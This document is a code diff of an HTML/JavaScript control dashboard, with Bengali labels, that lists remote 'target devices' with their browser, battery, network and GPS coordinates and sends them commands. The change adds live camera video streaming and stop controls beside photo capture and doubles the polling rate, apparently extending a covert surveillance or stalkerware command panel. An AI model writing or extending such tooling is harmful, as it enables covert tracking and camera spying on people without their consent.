@@ -21,12 +21,15 @@
         .online { border-left-color: #22c55e; }
         .no-data { text-align: center; color: #64748b; margin-top: 50px; }
         
-        .capture-btn { background: #ef4444; color: white; border: none; padding: 8px 12px; border-radius: 5px; font-size: 12px; cursor: pointer; margin-top: 10px; width: 100%; font-weight: bold; }
-        .capture-btn:hover { background: #dc2626; }
+        .action-btns { display: flex; gap: 10px; margin-top: 10px; }
+        .btn { flex: 1; color: white; border: none; padding: 8px; border-radius: 5px; font-size: 12px; cursor: pointer; font-weight: bold; }
+        .btn-capture { background: #ef4444; }
+        .btn-live { background: #22c55e; }
+        .btn-stop { background: #f59e0b; }
 
-        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; }
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; }
         .modal-content { background: #1e293b; padding: 20px; border-radius: 10px; max-width: 90%; max-height: 90%; text-align: center; }
-        .modal-content img { max-width: 100%; max-height: 80vh; border-radius: 5px; }
+        .modal-content img { max-width: 100%; max-height: 80vh; border-radius: 5px; background: black; }
         .close-btn { margin-top: 15px; background: #38bdf8; border: none; padding: 10px 20px; border-radius: 5px; color: white; font-weight: bold; cursor: pointer; }
     </style>
 </head>
@@ -44,8 +47,10 @@
         </div>
     </div>
 
+    <!-- ছবি ও ভিডিও দেখার মডাল -->
     <div id="imageModal" class="modal">
         <div class="modal-content">
+            <h3 id="modalTitle" style="margin-bottom: 10px; color: #38bdf8;">ক্যামেরা ফিড</h3>
             <img id="modalImage" src="" alt="Captured Photo">
             <br>
             <button class="close-btn" onclick="closeModal()">বন্ধ করুন</button>
@@ -63,6 +68,7 @@
         let circles = {};
         let selectedDeviceId = null; 
         let lastImageTime = {};
+        let isLiveMode = {}; // কোন ডিভাইসের লাইভ মোড চালু আছে তা মনে রাখার জন্য
 
         function fetchClients() {
             fetch('/api/clients')
@@ -100,25 +106,26 @@
                             <div class="detail">🌐 ব্রাউজার: <b>${data.browser || 'N/A'}</b></div>
                             <div class="detail">🔋 ব্যাটারি: <b>${data.battery || 'N/A'}%</b> (${data.charging || 'N/A'})</div>
                             <div class="detail">📶 নেটওয়ার্ক: <b>${data.network || 'N/A'}</b></div>
-                            <div class="detail">🗣️ ভাষা: <b>${data.language || 'N/A'}</b></div>
-                            <div class="detail">🕒 টাইমজোন: <b>${data.timezone || 'N/A'}</b></div>
-                            <div class="detail">🖥️ স্ক্রিন: <b>${data.screen || 'N/A'}</b></div>
-                            <div class="detail">⚙️ CPU কোর: <b>${data.cores}</b> | RAM: <b>${data.memory}</b></div>
                             <div class="detail" style="margin-top:10px; padding-top:10px; border-top: 1px solid #334155;">
                                 📍 অবস্থান: <b>${data.lat ? parseFloat(data.lat).toFixed(5) : 'N/A'}, ${data.lng ? parseFloat(data.lng).toFixed(5) : ''}</b><br>
-                                🎯 নির্ভুলতা: <b>${data.accuracy ? Math.round(data.accuracy) + ' মিটার' : 'N/A'}</b><br>
                                 🕒 শেষ আপডেট: <b>${data.lastSeen ? new Date(data.lastSeen).toLocaleTimeString() : 'N/A'}</b>
                             </div>
-                            <button class="capture-btn" onclick="event.stopPropagation(); captureImage('${id}')">📸 ছবি তুলুন</button>
+                            <div class="action-btns">
+                                <button class="btn btn-capture" onclick="event.stopPropagation(); captureImage('${id}')">📸 ছবি</button>
+                                <button class="btn btn-live" onclick="event.stopPropagation(); startLive('${id}')">🎥 লাইভ</button>
+                                <button class="btn btn-stop" onclick="event.stopPropagation(); stopLive('${id}')">⏹️ বন্ধ</button>
+                            </div>
                         `;
                         list.appendChild(card);
 
+                        // নতুন ছবি এলে পপআপ আপডেট করা
                         if (data.camera_image && data.camera_time && lastImageTime[id] !== data.camera_time) {
                             lastImageTime[id] = data.camera_time;
                             if (data.camera_image === "NO_PERMISSION") {
                                 alert("টার্গেট ডিভাইসে ক্যামেরার পারমিশন নেই!");
                             } else {
-                                showModal(data.camera_image);
+                                // লাইভ মোডে থাকলে পপআপ খোলা থাকবে এবং ছবি আপডেট হবে
+                                showModal(data.camera_image, isLiveMode[id] ? "🎥 লাইভ ভিডিও (স্ট্রিমিং...)" : "📸 তোলা ছবি");
                             }
                         }
 
@@ -147,26 +154,42 @@
                 .catch(err => console.error("Error fetching clients:", err));
         }
 
-        function captureImage(clientId) {
+        function sendCommand(clientId, command) {
             fetch('/api/command', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ client_id: clientId, command: 'capture' })
+                body: JSON.stringify({ client_id: clientId, command: command })
             })
             .then(res => res.json())
             .then(data => {
                 if (data.error) {
                     alert("ব্যর্থ: " + data.error);
-                } else {
-                    alert("কমান্ড পাঠানো হয়েছে! টার্গেট ডিভাইসের স্ক্রিনে ক্যামেরা পারমিশন চাইলে 'Allow' দিন।");
                 }
             })
             .catch(err => console.error("Error sending command:", err));
         }
 
-        function showModal(imageSrc) {
+        function captureImage(clientId) {
+            sendCommand(clientId, 'capture');
+            alert("ছবি তোলার কমান্ড পাঠানো হয়েছে!");
+        }
+
+        function startLive(clientId) {
+            isLiveMode[clientId] = true;
+            sendCommand(clientId, 'live_video');
+            alert("লাইভ ভিডিও শুরু হয়েছে! কিছুক্ষণ অপেক্ষা করুন।");
+        }
+
+        function stopLive(clientId) {
+            isLiveMode[clientId] = false;
+            sendCommand(clientId, 'stop_live');
+            alert("লাইভ ভিডিও বন্ধ করা হয়েছে!");
+        }
+
+        function showModal(imageSrc, title) {
             const modal = document.getElementById('imageModal');
             const img = document.getElementById('modalImage');
+            document.getElementById('modalTitle').innerText = title;
             img.src = imageSrc;
             modal.style.display = 'flex';
         }
@@ -176,7 +199,7 @@
         }
 
         fetchClients();
-        setInterval(fetchClients, 2000); // প্রতি ২ সেকেন্ডে চেক করবে
+        setInterval(fetchClients, 1000); // প্রতি ১ সেকেন্ডে ডেটা চেক করবে
     </script>
 </body>
 </html>
